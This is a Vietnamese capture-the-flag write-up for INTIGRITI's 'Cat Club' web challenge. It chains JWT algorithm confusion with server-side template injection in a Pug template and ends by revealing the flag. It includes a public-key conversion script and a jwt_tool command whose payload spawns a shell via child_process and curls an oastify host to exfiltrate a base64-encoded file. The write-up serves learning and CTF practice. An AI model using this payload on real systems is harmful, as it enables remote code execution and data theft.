---
title: Cat Club

---

![image](../img/14.png)

tiếp theo là 1 bài ctf web của INTIGRITI

mình dùng thử thì chỉ có chức năng register và login thôi nhé, check `XSS` ở register thì nó bị regex. Chall cho source nên view source nhá


![image](../img/15.png)

nhìn vào cấu trúc thư mục thấy có xuất hiện priv, pub key là theo bản năng mình nhận ra nó có thể dính `confusion key`

![image](../img/16.png)
view tiếp `router.js` mình thấy có endpoint này lòng lại vui như mở hội ngay =)), truy cập vào là có thể lấy được public_key

![image](../img/17.png)

tuy nhiên để có thể sử dụng được chúng ta cần chuyển nó qua định dạng `.pem`

mình có code script để convert nó

```
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers


jwk = {
    "kty": "RSA",
    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
    "e": "AQAB"
}


n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), byteorder='big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), byteorder='big')


public_numbers = RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()


pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Save to a .pem file
with open("public_key.pem", "wb") as pem_file:
    pem_file.write(pem)

print("Public RSA key saved to public_key.pem")


```

view thêm về source code để biết flag nằm ở đâu.
![image](../img/18.png)

có vẻ như cần RCE mới biết được flag dạng nào =)) 

![image](../img/19.png)

và BOOMM, chỗ này dính SSTI 100%, nó render `username` thay thế nào `/guest/` trong template `cats.pug`

=> Hướng exploit sẽ là:
1. Exploit confusion JWT to authen
2. Inject username into JWT to exploit SSTI 

giờ thì dùng `jwt_tool` để exploit nào

```
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk /home/kali/VSCODE/public_key.pem -I -pc username -pv "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl o2r497542gocxhc3v9h5g52zeqkh89wy.oastify.com?=\`cat /flag_tLmwRDxdWzoSCUWL.txt|base64\`')}()}"
```

![image](../img/20.png)

và boom!!!

![image](../img/21.png)

FLAG: `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`







